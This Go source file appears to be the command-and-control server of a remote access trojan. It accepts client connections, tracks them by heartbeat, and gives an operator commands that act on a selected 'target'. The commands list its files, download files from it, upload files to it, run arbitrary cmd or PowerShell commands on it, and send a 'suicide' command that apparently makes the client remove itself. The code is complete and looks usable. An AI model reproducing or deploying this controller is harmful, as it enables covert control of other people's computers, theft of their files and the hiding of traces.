package main

import (
	"MyOperatePacket4Server"
	"bufio"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func process(c net.Conn) { //接收对应客户端数据的协程
	ci := clientInfo{c: c, addr: c.RemoteAddr().String(), r: MyOperatePacket4Server.InitRecvPacket(c), s: MyOperatePacket4Server.InitSendPacket(c)}
	clientList.WriteConn(c.RemoteAddr().String(), &ci) //存储这个连接到全局连接表中
	for {
		v, e := MyOperatePacket4Server.ReadSign(c) //区分封包类型是心跳包还是执行结果反馈包
		//fmt.Println("读取到Sign",v)
		if e != nil {
			if !errors.Is(e, net.ErrClosed) { //由服务器强制关闭的连接不再打印
				fmt.Println("addr:", ci.addr, " Sign err")
				clientList.DelConn(ci.addr, e)
			}
			return
		}
		switch v {
		case HEARTBEAT:
			ci.SetTime() //记录最后一次收到封包的时间
		case CLIENT_PACKET:
			ci.SetTime()

			e := ci.r.RecvPacket()
			if e != nil {
				if !errors.Is(e, net.ErrClosed) { //由服务器强制关闭的连接不再打印
					fmt.Println("addr: ", ci.addr, " RecvPacket err")
					clientList.DelConn(ci.addr, e)
				}
				return
			}
		default:
			fmt.Println("addr: ", ci.addr, " Unknown Sign")
			clientList.DelConn(ci.addr, errors.New("addr: "+ci.addr+" wrong packet format: packet sign"))
			return
		}
	}
}
func WaitClient() { //等待客户端连接,连接后创建一个接收对应客户端数据的协程
	listen, err := net.Listen("tcp", "127.0.0.1:9999")
	if err != nil {
		log.Fatal("Listen() failed, err: ", err)
	}
	for {
		conn, err := listen.Accept()
		if err != nil {
			fmt.Println("Accept() failed, err: ", err)
			continue
		}
		go process(conn)
	}
}

func main() {
	logo()
	fmt.Println("使用\"命令 -h\" 或 \"命令 --help\" 或 \"/h\" 可以查看说明")
	clientList.d = make(map[string]*clientInfo)
	go WaitClient() //服务器启动一个协程用来不断接收客户端的连接

	reader := bufio.NewReader(os.Stdin)
	for {
		InitFlag() //为了每次循环都重新设置默认值,这里每次都把命令重新加载一遍(不知道有没有其他方法),因为flags.ParseArgs内部没有设置默认值

		input, err := reader.ReadString('\n')
		if err != nil {
			continue
		}
		input = input[:len(input)-1] //去掉'\n'

		scanner := bufio.NewScanner(strings.NewReader(input))
		scanner.Split(ScanWordsAndQuotes) //带有空格的路径请用引号括起来
		var commandLine []string
		for scanner.Scan() {
			commandLine = append(commandLine, scanner.Text())
		}

		if len(commandLine) == 0 {
			continue
		}
		command := commandLine[0]
		commandData, e := FlagParser.ParseArgs(commandLine)
		if e != nil {
			continue
		}

		//设置超时时间
		if currentClient != nil {
			if currentClient.wait == 0 {
				currentClient.c.SetDeadline(time.Time{})
			} else {
				currentClient.c.SetDeadline(time.Now().Add(currentClient.wait * time.Second))
			}
		}
		switch command {
		case "wait":
			if currentClient == nil {
				fmt.Println("请使用c ip:port命令选择目标")
				goto fail
			}
			v, e := strconv.Atoi(commandData[0])
			if e != nil {
				fmt.Println("Atoi err: ", e)
				goto fail
			}
			currentClient.wait = time.Duration(v)
		case "clear": //在调试窗口里面没用
			if runtime.GOOS == "windows" {
				cmd := exec.Command("cmd", "/c", "cls")
				cmd.Stdout = os.Stdout
				cmd.Run()
			} else if runtime.GOOS == "linux" {
				cmd := exec.Command("clear")
				cmd.Stdout = os.Stdout
				cmd.Run()
			}
		case "lsc":
			fmt.Println("-----------------")
			var i uint = 0
			clientList.m.RLock()
			for k, v := range clientList.d {
				i++
				if lsc_Option.Live > 0 {
					sep := time.Now().Sub(v.lastTime)
					if sep > time.Duration(lsc_Option.Live)*time.Second {
						i--
						clientList.m.RUnlock()
						clientList.DelConn(k, errors.New("heartbeat packet timeout"))
						clientList.m.RLock()
						continue
					}
				}
				v.num = i
				fmt.Println(i, ": ", k)
			}
			clientList.m.RUnlock()
			fmt.Println("-----------------")
			i = 0
		case "c":
			if len(commandData) > 0 {
				v, e := strconv.ParseUint(commandData[0], 10, 64)
				if e != nil {
					currentClient = clientList.ReadConn(commandData[0])
				} else {
					currentClient = clientList.ReadConnByNum(uint(v))
				}
				if currentClient == nil {
					fmt.Println("选择的目标不存在")
				}
			}
		case "pcc":
			if currentClient != nil {
				fmt.Println(currentClient.num, ": ", currentClient.addr)
			} else {
				fmt.Println("未选择目标")
			}
		case "lsf":
			if currentClient == nil {
				fmt.Println("请使用c ip:port命令选择目标")
				goto fail
			}
			currentClient.s.WriteUint32(LSF)                       //存储命令编号
			currentClient.s.WriteString(currentClient.currentPath) //存储当前路径
			e := currentClient.s.SendPacket()
			if e != nil {
				fmt.Println("Send Packet err: ", e)
				goto fail
			}

			e = currentClient.r.ReadyToRead()
			if e != nil {
				fmt.Println("Ready ToRead err: ", e)
				goto fail
			}
			//n,_:=currentClient.r.ReadUint32()/*读取文件和目录总数*/;if e!=nil{fmt.Println("Read Uint32 err: ",e);goto fail}
			for {
				a, e := currentClient.r.ReadUint32() /*读取文件(夹)属性,位于判断*/
				if e != nil {
					fmt.Println("Read Uint32 err: ", e)
					goto fail
				}
				if a == 0xffffffff {
					break
				}

				cpath, e := currentClient.r.ReadString() /*读取文件(夹)名*/
				if e != nil {
					fmt.Println("Read String err: ", e)
					goto fail
				}
				if a != 0 {
					fmt.Print("Attributes: ", a, " ")
				}
				if (a & 0x10) != 0 { //是否文件夹
					fmt.Print("folder: ")
				}
				fmt.Print(cpath, "\n")
			}
			currentClient.r.Finish()
		case "cd":
			if currentClient == nil {
				fmt.Println("请使用c ip:port命令选择目标")
				goto fail
			}
			if len(commandData) > 0 {
				if IsFullPath(commandData[0]) {
					currentClient.currentPath = commandData[0]
				} else if currentClient.currentPath == "" { //第一次必须cd 完整目录
					fmt.Println("起始目录有误")
					goto fail
				} else {
					currentClient.currentPath += "\\" + commandData[0]
				}
				currentClient.currentPath = filepath.Clean(currentClient.currentPath) //即使输入末尾包含..或路径中包含..,会转换为等价路径
			}
		case "pwd":
			{
				if currentClient == nil {
					fmt.Println("请使用c ip:port命令选择目标")
					goto fail
				}
				if currentClient.currentPath == "" {
					fmt.Println("空路径")
				} else {
					fmt.Println(currentClient.currentPath)
				}
			}
		case "download":
			if currentClient == nil {
				fmt.Println("请使用c ip:port命令选择目标")
				goto fail
			}
			if len(commandData) > 1 {
				if !IsFullPath(commandData[0]) {
					commandData[0] = filepath.Clean(currentClient.currentPath + "\\" + commandData[0])
				}
				if Exists(commandData[1]) { //如果是文件夹则补充上文件名
					if IsDir(commandData[1]) {
						commandData[1] += "\\" + filepath.Base(commandData[0])
					}
				}
				currentClient.s.WriteUint32(DOWNLOAD)       //存储命令编号
				currentClient.s.WriteString(commandData[0]) //存储要下载的目标机器的文件路径
				e := currentClient.s.SendPacket()
				if e != nil {
					fmt.Println("Send Packet err: ", e)
					goto fail
				}

				e = currentClient.r.ReadyToRead()
				if e != nil {
					fmt.Println("Ready ToRead err: ", e)
					goto fail
				}
				v, e := currentClient.r.ReadUint32()
				if e != nil {
					fmt.Println("Read Uint32 err: ", e)
					goto fail
				}
				if v == SUCCESS {
					b, e := currentClient.r.ReadBytes()
					if e != nil {
						fmt.Println("Read Bytes err: ", e)
						goto fail
					}
					e = WriteFileContents(commandData[1], b)
					if e == nil {
						fmt.Println("successfully download")
					} else {
						fmt.Println("download failed", e)
					}
				} else {
					fmt.Println("download failed")
				}
				currentClient.r.Finish()
			}
		case "upload":
			{
				if currentClient == nil {
					fmt.Println("请使用c ip:port命令选择目标")
					goto fail
				}
				if len(commandData) > 1 {
					if !IsFullPath(commandData[0]) {
						commandData[0] = filepath.Clean(currentClient.currentPath + "\\" + commandData[0])
					}
					if commandData[1][len(commandData[1])-1] == '\\' { //如果是文件夹则补充上文件名
						commandData[1] += "\\" + filepath.Base(commandData[0])
					}
					//读文件内容
					b, e := ReadFileContents(commandData[0])
					if e != nil {
						fmt.Println("read file err: ", e)
						goto fail
					}

					//下面这4行向客户端发送了一个封包,可以类比为用gob库发送了一个成员1为uint32, 成员2为String, 成员3为[]byte的结构体,客户端的实现里需要按照成员顺序用对应函数进行解析
					currentClient.s.WriteUint32(UPLOAD)         //存储命令编号
					currentClient.s.WriteString(commandData[1]) //存储输出到目标机器的文件路径
					currentClient.s.WriteBytes(b)               //存储文件内容
					e = currentClient.s.SendPacket()
					if e != nil {
						fmt.Println("Send Packet err: ", e)
						goto fail
					}

					//下面代码用于解析客户端发送的执行结果反馈封包(在客户端代码实现里暂时只发送一个),最开始需要先用ReadyToRead()等待客户端封包
					//在客户端的代码里只向服务器发送了一个uint32字段,用来指示执行结果;那么使用ReadUint32()读取(一定要有错误处理),可以类比为使用gob库解析一个只有uint32字段的结构体
					//如果客户端发送的反馈封包不止一个,读完封包内容后,需要调用ReadNextPacket(),来读取客户端下一个封包
					//最后读完客户端发来的全部执行结果反馈封包要调用Finish(),方便下一次发送了其他命令后,可以调用ReadyToRead等待客户端其他命令的执行结果反馈封包
					//一定要有错误处理,防止错误的封包格式和连接突然中断
					e = currentClient.r.ReadyToRead()
					if e != nil {
						fmt.Println("Ready ToRead err: ", e)
						goto fail
					}
					v, e := currentClient.r.ReadUint32()
					if e != nil {
						fmt.Println("Read Uint32 err: ", e)
						goto fail
					}
					currentClient.r.Finish()
					switch v {
					case SUCCESS:
						fmt.Println("successfully upload")
					case FAIL:
						fmt.Println("upload failed", e)
					}
				}
			}
		case "cmd":
			{
				if currentClient == nil {
					fmt.Println("请使用c ip:port命令选择目标")
					goto fail
				}
				if currentClient != nil {
					currentClient.c.SetDeadline(time.Time{})
				} //防止因为输入造成超时
				fmt.Print("请输入命令(执行cmd需要cmd /c前缀 执行ps要powershell -command前缀: ")
				input, err := reader.ReadString('\n')
				if err != nil {
					goto fail
				}
				if currentClient.wait == 0 {
					currentClient.c.SetDeadline(time.Time{})
				} else {
					currentClient.c.SetDeadline(time.Now().Add(currentClient.wait * time.Second))
				}
				currentClient.s.WriteUint32(CMD)
				if cmd_Option.Wait {
					currentClient.s.WriteUint32(1)
				} else {
					currentClient.s.WriteUint32(0)
				}
				currentClient.s.WriteString(input)
				currentClient.s.WriteString(currentClient.currentPath)
				e := currentClient.s.SendPacket()
				if e != nil {
					fmt.Println("Send Packet err: ", e)
					goto fail
				}

				e = currentClient.r.ReadyToRead()
				if e != nil {
					fmt.Println("Ready ToRead err: ", e)
					goto fail
				}
				v, e := currentClient.r.ReadUint32()
				if e != nil {
					fmt.Println("Read Uint32 err: ", e)
					goto fail
				}
				if v == SUCCESS {
					if cmd_Option.Wait {
						b, e := currentClient.r.ReadBytes()
						if e != nil {
							fmt.Println("Read Bytes err: ", e)
							goto fail
						}
						//fmt.Println(DecodeWindows1250(b[:len(b)-1]))
						fmt.Println(string(b[:len(b)-1]))
						//decoder := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()//UTF16转UTF8
						//utf8, e := decoder.Bytes(b[:len(b)-2])//去掉终止符
						//fmt.Println(string(utf8))
					}
					fmt.Println("successfully execute")
				} else {
					fmt.Println("execute failed")
				}
				currentClient.r.Finish()
			}
		case "suicide":
			{
				if currentClient == nil {
					fmt.Println("请使用c ip:port命令选择目标")
					goto fail
				}
				currentClient.s.WriteUint32(SUICIDE)
				e := currentClient.s.SendPacket()
				if e != nil {
					fmt.Println("Send Packet err: ", e)
					goto fail
				}
			}

		}

	fail:
		if currentClient != nil {
			currentClient.c.SetDeadline(time.Time{})
		}
	}
}
